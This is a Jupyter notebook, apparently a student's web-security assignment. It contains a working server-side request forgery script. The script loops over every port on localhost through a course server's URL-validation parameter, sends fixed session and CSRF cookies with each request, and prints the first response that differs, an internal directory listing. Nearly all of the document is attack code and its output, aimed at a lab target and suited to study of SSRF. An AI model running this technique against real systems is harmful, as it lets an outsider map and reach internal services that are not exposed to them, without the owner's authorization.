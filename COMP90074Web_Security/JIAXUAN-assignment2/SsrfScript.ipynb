{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://assignment-hermes.unimelb.life/validate.php?web=http://localhost:8873\n",
      "&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;&lt;html&gt;\n",
      "&lt;title&gt;Directory listing for /&lt;/title&gt;\n",
      "&lt;body&gt;\n",
      "&lt;h2&gt;Directory listing for /&lt;/h2&gt;\n",
      "&lt;hr&gt;\n",
      "&lt;ul&gt;\n",
      "&lt;li&gt;&lt;a href=&quot;documents/&quot;&gt;documents/&lt;/a&gt;\n",
      "&lt;li&gt;&lt;a href=&quot;random/&quot;&gt;random/&lt;/a&gt;\n",
      "&lt;li&gt;&lt;a href=&quot;storage/&quot;&gt;storage/&lt;/a&gt;\n",
      "&lt;/ul&gt;\n",
      "&lt;hr&gt;\n",
      "&lt;/body&gt;\n",
      "&lt;/html&gt;\n",
      "Does this look correct to you?\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "url='http://assignment-hermes.unimelb.life/validate.php?web=http://localhost:'\n",
    "cookies={'CSRF_token':'e2evX2U5gpu8crVsdSadTloQi6dwbomjRHlvmqJgkDVv5jBjx5uWpFM87CPyz9H9',\n",
    "         'PHPSESSID':'5lju0rqqf74ia89aptq668vv65'}\n",
    "for port in range(65535):\n",
    "    final_url=url+str(port)\n",
    "    r=requests.get(final_url,cookies=cookies)\n",
    "    if r.text!='Does this look correct to you?':\n",
    "        print(final_url)\n",
    "        print(r.text)\n",
    "        break"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
